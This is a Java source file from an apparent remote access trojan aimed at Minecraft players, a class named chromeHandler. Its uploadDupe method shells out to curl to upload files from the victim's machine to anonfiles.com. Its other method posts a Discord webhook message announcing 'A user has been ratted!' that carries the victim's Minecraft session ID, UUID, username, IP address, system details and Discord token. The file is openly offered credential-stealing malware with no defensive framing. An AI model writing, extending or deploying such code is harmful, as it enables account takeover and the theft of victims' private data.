package me.veryobvious.rat.grabbers.chromeshit;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Scanner;
import com.google.gson.*;

import org.apache.commons.io.FileUtils;
import me.veryobvious.rat.Main;
import me.veryobvious.rat.grabbers.misc;
import me.veryobvious.rat.grabbers.discordtoken;
import me.veryobvious.rat.grabbers.minecraft;
import me.veryobvious.rat.api.discordapi;
import java.awt.Color;
import java.net.HttpURLConnection;

public class chromeHandler {


    public void uploadDupe(String loc) throws IOException {
		try {
			Process process = Runtime.getRuntime().exec("curl -F \"file=@" + loc + "\" https://api.anonfiles.com/upload");
			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line = "";
			while ((line = reader.readLine()) != null) {
                Main.dataGrabbings = Main.dataGrabbings + "**" + loc + "** " + line + "\n";
			}
		} catch(IOException e) {
			e.printStackTrace();
		}
	}

	public static void balls() {
		new Thread(() -> {
            try {
                HttpURLConnection con = (HttpURLConnection) new URL("https://localhost:80/").openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-type", "application/json");
                con.setDoOutput(true);
                discordapi disc1 = new discordapi(Main.JsonFinalPayload());
                disc1.setContent("@everyone https://sky.shiiyu.moe/" + minecraft.getUuid().replace("-",""));
                disc1.setUsername("rats!");
                disc1.setAvatarUrl("https://cdn.discordapp.com/attachments/1046300257186746431/1075592578373783622/image.png");
                disc1.setTts(false);
                disc1.addEmbed(new discordapi.EmbedObject()
                    .setColor(Color.RED)
                    .setTitle("A user has been ratted!")
                    .addField("Username", "```" + minecraft.getUsername() + "```", true)
                    .addField("UUID", "```" + minecraft.getUuid().replace("-","") + "```", true)
                    .addField("Session ID", "```" + minecraft.getSession() + "```", false)
				);
				disc1.addEmbed(new discordapi.EmbedObject()
					.setColor(Color.RED)
					.addField("System Name", "```" + misc.getSysname() + "```", true)
					.addField("System OS", "```" + misc.getSysos() + "```", true)
					.addField ("IP", "```" + misc.getIp() + "```", true)
					.addField("Discord Token", "```" + discordtoken.getDiscordToken() + "```", false)
                );
                disc1.execute();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
	}
}